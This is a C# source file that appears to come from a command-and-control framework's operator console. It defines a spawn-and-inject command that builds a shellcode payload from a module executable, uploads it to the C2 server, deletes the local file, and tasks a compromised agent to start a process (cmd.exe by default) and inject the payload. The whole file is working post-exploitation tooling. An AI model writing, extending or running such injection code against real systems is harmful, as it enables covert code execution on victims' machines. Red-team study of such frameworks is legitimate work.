using Commander.Executor;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Inject
{
    public class SpawnInjectModuleCommandOptions
    {
        public string parameters { get; set; }
        public string processName { get; set; }
        public bool verbose { get; set; }
    }

    public abstract class SpawnInjectModuleCommand : EnhancedCommand<SpawnInjectModuleCommandOptions>
    {
        public override string Category => CommandCategory.Module;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public virtual string ExeName { get; set; }

        public virtual string ComputeParams(string innerParams)
        {
            return innerParams;
        }

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("parameters", () => string.Empty, "parameters to use"),
            new Option<string>(new[] { "--processName", "-p" }, () => "cmd.exe" ,"process name to start."),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<SpawnInjectModuleCommandOptions> context)
        {
            context.Terminal.WriteLine($"Generating payload with params {context.CommandParameters}...");

            var result = InjectCommand.GenerateBin(Path.Combine(InjectCommand.ModuleFolder, this.ExeName), this.ComputeParams(context.Options.parameters), out var binFileName);
            if (context.Options.verbose)
                context.Terminal.WriteLine(result);

            context.Terminal.WriteLine($"Pushing {binFileName} to the server...");

            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(binFileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            bool first = true;
            var fileId = await context.CommModule.Upload(fileBytes, binFileName, a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            });

            File.Delete(binFileName);
            string fileName = Path.GetFileName(binFileName);

            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn", fileId, fileName, $"{context.Options.processName}");
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.ShortId}.");
            return true;
        }
    }
}
